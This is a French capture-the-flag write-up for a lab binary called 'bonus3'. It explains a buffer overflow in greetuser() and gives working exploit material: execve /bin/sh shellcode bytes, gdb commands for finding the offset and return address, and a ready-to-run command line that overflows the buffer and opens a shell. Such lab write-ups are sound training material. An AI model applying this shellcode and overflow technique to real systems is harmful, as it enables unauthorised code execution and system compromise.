"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

Offset 23

set args $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')

(gdb) find /b $esp, +1000, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80


# Bonus3 - Buffer Overflow avec Variables d'Environnement

## Analyse du Programme

**Structure**
- Prend deux arguments en ligne de commande
- Utilise une variable d'environnement LANG
- Contient une fonction greetuser() qui affiche différents messages selon la langue

**Buffers**
- s : Premier buffer pour argv[1]
- var_38 : Buffer pour argv
- str : Buffer dans greetuser()

## Vulnérabilités

**Buffer Overflow dans greetuser()**
- strcat(str, &str) tente de concaténer une zone mémoire au-delà du buffer str
- Cette zone contient les données copiées depuis var_38

**Copie de Mémoire Non Sécurisée**
```c
memcpy(&s[76], var_38, 76);
```
- Copie 76 bytes à partir de la fin du buffer s
- Permet d'écrire au-delà des limites du buffer

## Exploitation

**Construction du Payload**
```python
# Premier argument : shellcode + padding
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
arg1 = "\x90" * 40 + shellcode

# Second argument : padding + adresse de retour
arg2 = "A" * 23 + "\x08\xf8\xff\xbf"
```

**Commande d'Exploitation**
```bash
./bonus3 $(python -c 'print 40*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print 23*"A" + "\x08\xf8\xff\xbf"')
```

## Processus d'Exploitation

1. Le premier argument contient :
   - Des NOPs comme zone d'atterrissage
   - Le shellcode qui exécute /bin/sh

2. Le second argument contient :
   - Un padding de 23 bytes
   - L'adresse de retour pointant vers notre shellcode

3. La fonction greetuser() :
   - Tente de concaténer la zone mémoire corrompue
   - Provoque un débordement de buffer
   - Redirige l'exécution vers notre shellcode

4. Le shellcode est exécuté, donnant accès à un shell

